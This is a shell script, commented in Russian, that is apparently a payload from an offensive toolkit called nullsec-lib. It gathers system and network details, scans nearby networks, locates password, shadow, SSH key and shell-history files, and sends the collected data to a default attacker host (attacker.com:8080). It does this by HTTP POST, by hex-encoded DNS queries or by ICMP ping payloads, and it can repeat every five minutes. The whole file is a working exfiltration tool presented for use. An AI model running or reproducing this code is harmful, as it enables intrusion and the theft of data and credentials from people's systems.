#!/bin/sh
# data-exfil-payload.sh — Пейлоуд для эксфильтрации данных
# Использует nullsec-lib для надежной работы
# Категория: user/exfil

# Подключение библиотеки
. /usr/lib/nullsec-lib.sh

# Заголовок пейлоуда
nullsec_payload_header "Data Exfiltration Suite" "2.0.0"

# Конфигурация
EXFIL_SERVER="${1:-http://attacker.com:8080}"
EXFIL_METHOD="${2:-http}"  # http, dns, icmp
INTERFACE="${3:-wlan0}"

log_info "Сервер эксфильтрации: $EXFIL_SERVER"
log_info "Метод: $EXFIL_METHOD"

# Инициализация базы данных
nullsec_init_db

# Функция для сбора системной информации
collect_system_info() {
    log_info "=== СБОР СИСТЕМНОЙ ИНФОРМАЦИИ ==="

    # Информация о системе
    local sysinfo=$(cat << EOF
{
  "hostname": "$(hostname)",
  "kernel": "$(uname -a)",
  "uptime": "$(uptime)",
  "interfaces": "$(ip addr show | grep -E 'inet|link' | head -10)",
  "routes": "$(ip route show)",
  "processes": "$(ps aux | head -20)",
  "disk": "$(df -h)",
  "memory": "$(free -h)",
  "timestamp": "$(date)"
}
EOF
)

    echo "$sysinfo" > /tmp/system_info.json
    log_info "Системная информация собрана"
}

# Функция для сбора сетевой информации
collect_network_info() {
    log_info "=== СБОР СЕТЕВОЙ ИНФОРМАЦИЦИ ==="

    # Сканирование сети
    local network_scan=$(nullsec_scan_network "$INTERFACE" 24)

    # ARP таблица
    local arp_table=$(arp -a 2>/dev/null || cat /proc/net/arp)

    # DNS информация
    local dns_info=$(cat /etc/resolv.conf 2>/dev/null)

    local netinfo=$(cat << EOF
{
  "network_scan": "$network_scan",
  "arp_table": "$arp_table",
  "dns_servers": "$dns_info",
  "wifi_scan": "$(nullsec_scan_wifi "$INTERFACE" 10)",
  "timestamp": "$(date)"
}
EOF
)

    echo "$netinfo" > /tmp/network_info.json
    log_info "Сетевая информация собрана"
}

# Функция для поиска конфиденциальных файлов
find_sensitive_files() {
    log_info "=== ПОИСК КОНФИДЕНЦИАЛЬНЫХ ФАЙЛОВ ==="

    local sensitive_files=""

    # Поиск файлов с паролями
    sensitive_files="$sensitive_files$(find /etc -name "*passwd*" -o -name "*shadow*" -o -name "*secret*" 2>/dev/null | head -10)\n"

    # Поиск SSH ключей
    sensitive_files="$sensitive_files$(find /home -name ".ssh" -type d 2>/dev/null | xargs find 2>/dev/null | head -10)\n"

    # Поиск конфигурационных файлов
    sensitive_files="$sensitive_files$(find /etc -name "*.conf" -o -name "*.cfg" 2>/dev/null | head -10)\n"

    # Поиск истории команд
    sensitive_files="$sensitive_files$(find /home -name ".bash_history" -o -name ".zsh_history" 2>/dev/null | head -5)\n"

    echo -e "$sensitive_files" > /tmp/sensitive_files.txt
    log_info "Найдено конфиденциальных файлов: $(wc -l < /tmp/sensitive_files.txt)"
}

# Функция эксфильтрации через HTTP
exfil_http() {
    local file="$1"
    local filename=$(basename "$file")

    log_info "Эксфильтрация $filename через HTTP..."

    if [ ! -f "$file" ]; then
        log_warn "Файл не найден: $file"
        return 1
    fi

    # Кодирование в base64 для безопасной передачи
    local encoded_data=$(base64 "$file" 2>/dev/null)

    if [ -z "$encoded_data" ]; then
        log_error "Ошибка кодирования файла"
        return 1
    fi

    # Отправка через curl
    local response=$(curl -s -X POST "$EXFIL_SERVER/exfil" \
                        -H "Content-Type: application/json" \
                        -d "{\"filename\":\"$filename\",\"data\":\"$encoded_data\",\"timestamp\":\"$(date)\"}" \
                        --max-time 30)

    if [ $? -eq 0 ]; then
        log_info "✓ Файл $filename успешно эксфильтрован"
        return 0
    else
        log_error "✗ Ошибка эксфильтрации $filename"
        return 1
    fi
}

# Функция эксфильтрации через DNS
exfil_dns() {
    local data="$1"
    local domain="${EXFIL_SERVER#http://}"

    log_info "Эксфильтрация через DNS..."

    if ! command -v dig >/dev/null 2>&1; then
        log_error "dig не установлен для DNS эксфильтрации"
        return 1
    fi

    # Разбиение данных на части (DNS имеет ограничения на длину)
    local chunk_size=50
    local chunks=$(echo "$data" | fold -w"$chunk_size")

    local chunk_num=1
    echo "$chunks" | while read -r chunk; do
        # Кодирование chunk в hex
        local hex_chunk=$(echo -n "$chunk" | xxd -p | tr -d '\n')

        # Отправка через DNS запрос
        dig "${chunk_num}.${hex_chunk}.${domain}" >/dev/null 2>&1

        if [ $? -eq 0 ]; then
            log_debug "Отправлен chunk $chunk_num"
        else
            log_warn "Ошибка отправки chunk $chunk_num"
        fi

        chunk_num=$((chunk_num + 1))
        sleep 1  # Небольшая пауза между запросами
    done

    log_info "DNS эксфильтрация завершена"
}

# Функция эксфильтрации через ICMP
exfil_icmp() {
    local data="$1"

    log_info "Эксфильтрация через ICMP..."

    if ! command -v ping >/dev/null 2>&1; then
        log_error "ping не доступен для ICMP эксфильтрации"
        return 1
    fi

    # Разбиение данных на небольшие пакеты
    local chunks=$(echo "$data" | fold -w32)

    echo "$chunks" | while read -r chunk; do
        # Отправка через ping с данными в payload
        ping -c 1 -p "$(echo -n "$chunk" | xxd -p | cut -c1-16)" "$EXFIL_SERVER" >/dev/null 2>&1

        if [ $? -eq 0 ]; then
            log_debug "Отправлен ICMP пакет"
        else
            log_warn "Ошибка отправки ICMP пакета"
        fi

        sleep 0.5
    done

    log_info "ICMP эксфильтрация завершена"
}

# Функция основной эксфильтрации
perform_exfiltration() {
    local method="$1"

    log_info "=== НАЧАЛО ЭКСФИЛЬТРАЦИИ ==="
    log_info "Метод: $method"

    # Сбор данных
    collect_system_info
    collect_network_info
    find_sensitive_files

    # Эксфильтрация системной информации
    case "$method" in
        "http")
            exfil_http "/tmp/system_info.json"
            exfil_http "/tmp/network_info.json"
            exfil_http "/tmp/sensitive_files.txt"
            ;;
        "dns")
            exfil_dns "$(cat /tmp/system_info.json)"
            exfil_dns "$(cat /tmp/network_info.json)"
            exfil_dns "$(cat /tmp/sensitive_files.txt)"
            ;;
        "icmp")
            exfil_icmp "$(cat /tmp/system_info.json)"
            exfil_icmp "$(cat /tmp/network_info.json)"
            exfil_icmp "$(cat /tmp/sensitive_files.txt)"
            ;;
        *)
            log_error "Неизвестный метод эксфильтрации: $method"
            return 1
            ;;
    esac

    # Очистка временных файлов
    rm -f /tmp/system_info.json /tmp/network_info.json /tmp/sensitive_files.txt

    log_info "Эксфильтрация завершена"
}

# Функция для периодической эксфильтрации
start_periodic_exfil() {
    local interval="${1:-300}"  # 5 минут по умолчанию

    log_info "Запуск периодической эксфильтрации (интервал: ${interval} сек)"

    while true; do
        perform_exfiltration "$EXFIL_METHOD"

        # Сохранение в базу данных
        sqlite3 "$(nullsec_get_config DB_FILE)" << EOF
INSERT INTO exfiltrated_data (method, timestamp, status)
VALUES ('$EXFIL_METHOD', '$(date)', 'success');
EOF

        sleep "$interval"
    done
}

# Основная логика
main() {
    # Проверка подключения к серверу эксфильтрации
    if ! nullsec_test_connection "$EXFIL_SERVER" 10; then
        log_warn "Сервер эксфильтрации недоступен: $EXFIL_SERVER"
        log_info "Работа в автономном режиме (данные будут сохранены локально)"
    fi

    # Выбор режима работы
    if [ "$EXFIL_METHOD" = "periodic" ]; then
        start_periodic_exfil 300
    else
        # Одноразовая эксфильтрация
        perform_exfiltration "$EXFIL_METHOD"

        # Сохранение результатов
        sqlite3 "$(nullsec_get_config DB_FILE)" << EOF
INSERT INTO payloads (name, type, status, config)
VALUES ('data_exfil_$(date +%s)', 'data_exfil', 'completed', '{"server":"$EXFIL_SERVER","method":"$EXFIL_METHOD","timestamp":"$(date)"}');
EOF

        log_info "Эксфильтрация данных завершена"
    fi
}

# Запуск основной логики
main

# Завершение
nullsec_payload_footer "Data Exfiltration Suite" "completed"